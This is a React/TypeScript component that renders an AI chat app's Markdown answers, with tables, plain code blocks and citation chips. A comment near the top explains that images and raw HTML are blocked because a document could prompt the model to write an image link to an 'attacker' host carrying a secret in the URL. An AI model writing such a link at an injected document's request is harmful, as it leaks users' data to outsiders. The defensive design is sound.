import ReactMarkdown, { type Components } from "react-markdown"
import remarkGfm from "remark-gfm"
import type { Element, ElementContent } from "hast"

import "@/components/chat-motion.css"
import { CitationChip } from "@/components/citations"
import { CodeBlock, CodeBlockContent } from "@/components/ui/code-block"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { citedNumber, remarkCitations } from "@/lib/citations"
import { rehypeStreaming } from "@/lib/rehype-streaming"
import { cn } from "@/lib/utils"

const textOf = (node: Element | ElementContent): string =>
  node.type === "text" ? node.value : node.type === "element" ? node.children.map(textOf).join("") : ""

// Answers never load images or render raw HTML: a document could tell the model to
// write ![](https://attacker/?q=<secret>), and the browser would send it on its own.
// An image shows as its alt text instead, and HTML in the text is dropped (skipHtml).
// A [S#] marker (made a "#cite-#" link by remarkCitations) is a citation chip.
// Tables (e.g. rows quoted from an attached spreadsheet, C24) as the app's own
// tables: wide ones scroll sideways inside the answer, not the page. Fenced code as
// a plain Code Block (no highlighter: it would bring shiki).
const ANSWER_MARKDOWN: Components = {
  img: ({ alt }) => (alt ? <span className="text-muted-foreground">[{alt}]</span> : null),
  table: ({ children }) => (
    <div className="my-3 rounded-lg border border-border/70 font-sans text-sm leading-normal">
      <Table>{children}</Table>
    </div>
  ),
  thead: ({ children }) => <TableHeader className="bg-muted/50">{children}</TableHeader>,
  tbody: ({ children }) => <TableBody>{children}</TableBody>,
  tr: ({ children }) => <TableRow>{children}</TableRow>,
  th: ({ children }) => <TableHead className="h-8 px-3">{children}</TableHead>,
  td: ({ children }) => <TableCell className="px-3 py-1.5 whitespace-normal">{children}</TableCell>,
  pre: ({ node }) => (
    <CodeBlock size="sm" className="my-3">
      <CodeBlockContent>{node ? textOf(node).replace(/\n$/, "") : null}</CodeBlockContent>
    </CodeBlock>
  ),
  a: ({ href, title, children }) => {
    const n = citedNumber(href)
    return n ? (
      <CitationChip n={n} />
    ) : (
      <a href={href} title={title}>
        {children}
      </a>
    )
  },
}

// An answer's markdown, in the reading measure: 15px / 1.7, at most 68 characters a
// line. While it streams, its words fade in and a caret follows them
// (lib/rehype-streaming.ts); finished, it is plain text.
export function Markdown({ text, streaming, className }: { text: string; streaming?: boolean; className?: string }) {
  return (
    <div
      data-slot="answer-markdown"
      className={cn(
        "max-w-[68ch] text-reading text-pretty text-foreground",
        "[&_a]:underline [&_a]:underline-offset-2 [&_li]:my-1 [&_ol]:list-decimal [&_ol]:pl-5 [&_p]:my-2.5 [&_ul]:list-disc [&_ul]:pl-5",
        "[&>:first-child]:mt-0 [&>:last-child]:mb-0 [&_h1,&_h2,&_h3,&_h4]:mt-4 [&_h1,&_h2,&_h3,&_h4]:mb-2 [&_h1,&_h2,&_h3,&_h4]:font-semibold [&_h1,&_h2,&_h3,&_h4]:tracking-tight",
        "[&_strong]:font-semibold [&_blockquote]:border-l-2 [&_blockquote]:border-border [&_blockquote]:pl-3 [&_blockquote]:text-muted-foreground",
        "[&_:not(pre)>code]:rounded [&_:not(pre)>code]:bg-muted [&_:not(pre)>code]:px-1 [&_:not(pre)>code]:py-0.5 [&_:not(pre)>code]:font-mono [&_:not(pre)>code]:text-[0.85em]",
        className,
      )}
    >
      <ReactMarkdown
        remarkPlugins={[remarkGfm, remarkCitations]}
        rehypePlugins={streaming ? [rehypeStreaming] : []}
        skipHtml
        components={ANSWER_MARKDOWN}
      >
        {text}
      </ReactMarkdown>
    </div>
  )
}
